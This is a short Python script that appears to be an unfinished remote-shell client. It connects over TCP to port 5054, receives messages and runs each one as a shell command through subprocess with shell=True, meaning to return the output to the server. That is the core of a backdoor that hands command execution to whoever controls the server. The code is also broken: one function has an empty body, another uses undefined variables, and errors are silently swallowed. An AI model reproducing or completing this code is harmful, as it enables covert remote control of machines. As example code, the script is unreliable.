#!/usr/bin/env python3
import socket
import os
import subprocess
import shlex

HEADER = 64
PORT = 5054
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "exit"
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def execute_command(cmd_str):
    #args = shlex.split(msg)
    try:
        proc = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("STDOUT: " + proc.stdout.read().decode())
        stdoutput = proc.stdout.read() + proc.stderr.read()
        conn.sendall(stdoutput)
    except:
        pass

def snd_msg(msg):
    

def listen_to_server(conn):
    print(f"Connected to {SERVER}")
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            print(msg)

            if msg == DISCONNECT_MESSAGE:
                connected = False

            else:
                execute_command(msg)



    conn.close()

listen_to_server(client)
